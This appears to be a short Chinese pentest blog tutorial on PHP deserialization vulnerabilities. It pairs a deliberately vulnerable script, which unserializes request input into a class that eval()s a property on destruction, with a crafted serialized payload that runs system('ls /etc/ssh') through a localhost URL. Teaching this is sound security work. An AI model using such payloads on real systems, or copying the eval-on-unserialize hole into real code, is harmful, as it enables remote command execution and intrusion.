+++
date = "2016-07-25T23:32:52+08:00"
description = ""
draft = false
tags = ["反序列化"]
title = "PHP反序列化漏洞"
topics = ["Pentest"]

+++

### 0x00 关于反序列化漏洞
序列化：使用函数serialize()可将实例序列化为字符串  
反序列化：使用函数unserialize()可将序列化的字符串还原  

* 服务端有test.php，代码如下

```php
<?php
    class fun{
        public $msg;
        function __construct(){
            echo '__construct';
        }
        function __destruct() {
            eval($this->msg);
        }
    }

    $d = $_REQUEST['str'];
    var_dump($d);
    echo "<br />";
    $tc = unserialize($d);
    var_dump($tc);
?>
```

* 客户端可构造如下代码生成序列化后的字符串

```php
<?php
    class fun{
        public $msg;
        function __construct(){
            echo '__construct';
        }
        function __destruct() {
            eval($this->msg);
        }
    }

    $f = new fun();
    $f->msg = "system('ls /etc/ssh');";
    echo serialize($f);
?>
```

生成的序列化字符串为：```O:3:"fun":1:{s:3:"msg";s:22:"system('ls /etc/ssh');";}```

* 提交序列化字符串给服务端从而执行命令

访问```http://127.0.0.1/test.php?str=O:3:"fun":1:{s:3:"msg";s:22:"system('ls /etc/ssh');";}```即可得到/etc/ssh下的文件
